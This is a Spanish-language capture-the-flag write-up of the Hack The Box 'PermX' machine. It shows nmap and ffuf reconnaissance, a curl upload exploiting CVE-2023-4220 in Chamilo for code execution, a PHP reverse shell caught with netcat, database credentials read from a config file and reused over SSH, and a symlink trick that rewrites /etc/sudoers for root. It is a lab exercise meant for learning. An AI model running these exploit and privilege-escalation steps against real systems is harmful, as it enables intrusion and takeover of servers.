<!DOCTYPE html>
<html>
<head>
<title>doc.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="documentaci%C3%B3n-de-la-m%C3%A1quina-permx"><strong>Documentación de la Máquina PermX</strong></h1>
<h2 id="%C3%ADndice"><strong>Índice</strong></h2>
<ul>
<li><a href="#documentaci%C3%B3n-de-la-m%C3%A1quina-permx"><strong>Documentación de la Máquina PermX</strong></a>
<ul>
<li><a href="#%C3%ADndice"><strong>Índice</strong></a></li>
<li><a href="#introducci%C3%B3n"><strong>Introducción</strong></a></li>
<li><a href="#reconocimiento"><strong>Reconocimiento</strong></a>
<ul>
<li><a href="#escaneo-de-puertos"><strong>Escaneo de Puertos</strong></a></li>
</ul>
</li>
<li><a href="#b%C3%BAsqueda-de-subdominios"><strong>Búsqueda de Subdominios</strong></a></li>
<li><a href="#identificaci%C3%B3n-de-la-vulnerabilidad"><strong>Identificación de la Vulnerabilidad</strong></a>
<ul>
<li><a href="#explotaci%C3%B3n-de-la-vulnerabilidad"><strong>Explotación de la vulnerabilidad</strong></a></li>
<li><a href="#explotaci%C3%B3n-de-la-reverse-shell"><strong>Explotación de la reverse shell</strong></a></li>
</ul>
</li>
<li><a href="#escalada-de-privilegios"><strong>Escalada de privilegios</strong></a></li>
</ul>
</li>
</ul>
<h2 id="introducci%C3%B3n"><strong>Introducción</strong></h2>
<ul>
<li><strong>Nombre de la Máquina</strong>: PermX</li>
<li><strong>Plataforma</strong>: Hack The Box</li>
<li><strong>Dificultad</strong>: Fcil</li>
<li><strong>Resumen</strong>: RCE (Remote Code Execution)</li>
</ul>
<h2 id="reconocimiento"><strong>Reconocimiento</strong></h2>
<h3 id="escaneo-de-puertos"><strong>Escaneo de Puertos</strong></h3>
<p><strong>Comando Nmap</strong>:</p>
<pre><code>nmap -sC -sV -oN scan_ini 10.10.11.23
</code></pre>
<ul>
<li>sC: Para utilizar los scripts de escaneo básicos.</li>
<li>sV: Nos indica la versión de los servicios con los puertos abiertos</li>
<li>oN scan_ini: La salida de nmap se guarda en un archivo scan_ini.</li>
</ul>
<p><strong>Salida Nmap</strong>:</p>
<pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-20 14:15 UTC
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds
</code></pre>
<p><strong>Conclusión de resultado Nmap</strong>:</p>
<p>Nmap nos indica en este escaneo que la máquina tiene dos puertos abiertos. El 22 el cual, como en este caso, suele ser el puerto de un servidor SSH y el 80 el puerto de un servidor web. Me decido a observar que devuelve este servidor web usando un Firefox: <img src="image3.png" alt="Firefox no resuelve la ip de la máquina"></p>
<p>Para solucionar esto añadimos la siguiente linea al archivo <strong>/etc/hosts</strong>:
<img src="image2.png" alt="10.10.11.23 permx.htb"></p>
<p>Ahora entrando de nuevo desde Firefox, ya mejora la cosa 😂:
<img src="image4.png" alt="http://permx.htb/"></p>
<h2 id="b%C3%BAsqueda-de-subdominios"><strong>Búsqueda de Subdominios</strong></h2>
<p>Como navengando por la web no encuentro nada útil en el código fuente, ni algún tipo de formulario para probar SQLi, decido probar a buscar subdominios con la herramienta <a href="https://github.com/ffuf/ffuf">ffuf</a> y <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt">lista de posibles dominios</a>:</p>
<pre><code>┌─[✗]─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ #ffuf -u http://permx.htb -H &quot;Host:FUZZ.permx.htb&quot; -w subdomains-top1million-20000.txt -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /home/user/Desktop/htb/PermX/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 589ms]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 4991ms]
</code></pre>
<p>Vemos que tenemos un nuevo dominio a parte del www al que accedimos al principio, entramos en lms.permx.htb y de nuevo firefox no resuelve la url por lo que añado una nueva linea en /etc/hosts para que resuelva correctamente. Una vez añadida nos encontramos con este panel de acceso:</p>
<p><img src="image5.png" alt="Panel de acceso a plataforma Chamilo"></p>
<h2 id="identificaci%C3%B3n-de-la-vulnerabilidad"><strong>Identificación de la Vulnerabilidad</strong></h2>
<p>Pruebo con SQLi y no consigo nada, asi que mirando por 'internete' para ver que era esta plataforma, por que la verdad nunca antes habia oido hablar de ella. Veo que es un software open-source para publicar cursos online... a mayores encuentro que tiene una vulnerabilidad <a href="https://starlabs.sg/advisories/23/23-4220/">(CVE-2023-4220)</a>. Como se explica en el propio artículo consiste en un fallo a la hora de sanatizar los archivos que se suben al servidor, pudiendo subir así subir .php ejecutables desde la máquina atacantes, vamos lo que viene siendo Remote Code Execution. Hago la prueba que pone en el artículo y 'voilà' me devuelve la salida esperada viendo info. de el usuario que ejecuta el .php desde la maquina víctima:</p>
<h3 id="explotaci%C3%B3n-de-la-vulnerabilidad"><strong>Explotación de la vulnerabilidad</strong></h3>
<pre><code>┌─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 
    The file has successfully been uploaded.┌─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<h3 id="explotaci%C3%B3n-de-la-reverse-shell"><strong>Explotación de la reverse shell</strong></h3>
<p>Pues tocaría hacer una reverse shell desde la máquina objetivo. Utilizo el siguiente <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">.php</a>, sustituyendo mi ip de htb y el puerto que pongo a la escucha con nc -lvnp 1234 desde mi máquina: <img src="image6.png" alt="Diagrama de la reverse shell"></p>
<p><strong>Escuchar desde máquina atacante</strong>: (python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' para tener una shell mas fácil de usar (resumen resumido))</p>
<pre><code>┌─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ #nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.11.23 56712
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:27:32 up  1:01,  0 users,  load average: 0.00, 0.01, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
www-data@permx:/$ whoami
whoami
www-data
</code></pre>
<p><strong>Ejecutar .php</strong>:</p>
<pre><code>┌─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ #curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 
The file has successfully been uploaded.┌─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ #curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'
</code></pre>
<p>Curioseando con la reverse shell veo un carpeta mtz en el directorio home de la victima a la que no tenemos acceso... sigo mirando...:</p>
<pre><code>www-data@permx:/$ cd home
cd home
www-data@permx:/home$ ls
ls
mtz
www-data@permx:/home$ cd mtz
cd mtz
bash: cd: mtz: Permission denied
</code></pre>
<p>En la carpeta donde se configura el servidor web busco alguna credencial para el servicio de SSH o algo que resulte util. Vemos un configuration.php interesante, en el encontramos un user y un pass para lo que sería una base de datos:</p>
<pre><code>www-data@permx:/var/www/chamilo/app/config$ cat configuration.php | grep pass
cat configuration.php | grep pass
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Security word for password recovery
$_configuration['password_encryption'] = 'bcrypt';
...


www-data@permx:/var/www/chamilo/app/config$ cat configuration.php | grep user 
cat configuration.php | grep user
$_configuration['db_user'] = 'chamilo';
// Map CAS attributes with user/user extrafields values BT#17620
...
</code></pre>
<p>A primera vista son las credenciales de una base de datos asi que pruebo a ver si son correctas. Me encuentro con estos hashes de contraseñas, lo primero que pienso es usar HashCat para ver si saco las contraseñas pero como el ordenador no lo da resuelto (espero mucho tiempo jaja) pues decido ir a ver si hay otra solución:</p>
<pre><code>MariaDB [chamilo]&gt; select username, password from user;
select username, password from user;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |
| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |
+----------+--------------------------------------------------------------+
2 rows in set (0.000 sec)
</code></pre>
<p>En esta parte, ya final para el user.txt tuve la 'ayuda' con un amigo y es que resulta que tanto la base de datos como el usuario de ssh, (el que no es root) mtz, comparten la misma contraseña !!</p>
<pre><code>┌─[root@parrot]─[/home/user/Desktop/htb/PermX]
└──╼ #ssh tmz@10.10.11.23
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
tmz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 20 04:49:27 PM UTC 2024

  System load:           0.21
  Usage of /:            95.1% of 7.19GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             444
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.23
  IPv6 address for eth0: dead:beef::250:56ff:fe94:ddd3

  =&gt; / is using 95.1% of 7.19GB
  =&gt; There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jul 20 16:38:43 2024 from 10.10.14.253
mtz@permx:~$ whoami
mtz
mtz@permx:~$ pwd
/home/mtz
mtz@permx:~$ ls
helpfile  su_makineyle_oynamayın  user.txt
mtz@permx:~$ cat user.txt
</code></pre>
<h2 id="escalada-de-privilegios"><strong>Escalada de privilegios</strong></h2>
<p>La solución encontrada para esta parte de la máquina consiste en, primero, buscar alguna ejecución como root desde el usuario mtz:</p>
<pre><code>mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
</code></pre>
<p>El contenido de este archivo acl.sh es que mediante parámetros correctos podemos cambiar los permisos de un archivo...</p>
<pre><code>mtz@permx:~$ cat /opt/acl.sh 
#!/bin/bash

if [ &quot;$#&quot; -ne 3 ]; then
    /usr/bin/echo &quot;Usage: $0 user perm file&quot;
    exit 1
fi

user=&quot;$1&quot;
perm=&quot;$2&quot;
target=&quot;$3&quot;

if [[ &quot;$target&quot; != /home/mtz/* || &quot;$target&quot; == *..* ]]; then
    /usr/bin/echo &quot;Access denied.&quot;
    exit 1
fi

# Check if the path is a file
if [ ! -f &quot;$target&quot; ]; then
    /usr/bin/echo &quot;Target must be a file.&quot;
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:&quot;$user&quot;:&quot;$perm&quot; &quot;$target&quot;
</code></pre>
<p>De primeras pruebo a ver si en el directorio de root puedo leer el archivo con la flag de root, mal por mi parte por que no tengo permisos en el directorio root 😂:</p>
<pre><code>mtz@permx:~$ sudo /opt/acl.sh mtz rw /root/root.txt
Access denied.
</code></pre>
<p>Asi que mejor modificar el archivo que me limita el acceso como sudo, en /etc/sudoers (ahora es obvio pero no me di cuenta... no tengo acceso 😂):</p>
<pre><code>mtz@permx:~$ sudo /opt/acl.sh mtz rw /etc/sudoers
Access denied.
</code></pre>
<p>Pruebo a creear un enlace simbólico:</p>
<pre><code>mtz@permx:~$ ln -s /etc/sudoers ./enlace
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/enlace
mtz@permx:~$ cat enlace
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;
Defaults	use_pty

# This preserves proxy settings from user environments of root
# equivalent users (group sudo)
#Defaults:%sudo env_keep += &quot;http_proxy https_proxy ftp_proxy all_proxy no_proxy&quot;

# This allows running arbitrary commands, but so does ALL, and it means
# different sudoers have their choice of editor respected.
#Defaults:%sudo env_keep += &quot;EDITOR&quot;

# Completely harmless preservation of a user preference.
#Defaults:%sudo env_keep += &quot;GREP_COLOR&quot;

# While you shouldn't normally run git as root, you need to with etckeeper
#Defaults:%sudo env_keep += &quot;GIT_AUTHOR_* GIT_COMMITTER_*&quot;

# Per-user preferences; root won't have sensible values for them.
#Defaults:%sudo env_keep += &quot;EMAIL DEBEMAIL DEBFULLNAME&quot;

# &quot;sudo scp&quot; or &quot;sudo rsync&quot; should be able to use your SSH agent.
#Defaults:%sudo env_keep += &quot;SSH_AGENT_PID SSH_AUTH_SOCK&quot;

# Ditto for GPG agent
#Defaults:%sudo env_keep += &quot;GPG_AGENT_INFO&quot;

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on &quot;@include&quot; directives:

@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
</code></pre>
<p>Edito la ultima linea sustituyendola por ALL y...</p>
<pre><code>mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/enlace
mtz@permx:~$ nano enlace
mtz@permx:~$ sudo su
root@permx:/home/mtz# cd /root
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
</code></pre>
<p>🎉🎉🎉</p>
<p><img src="image.png" alt="pwnd"></p>

</body>
</html>
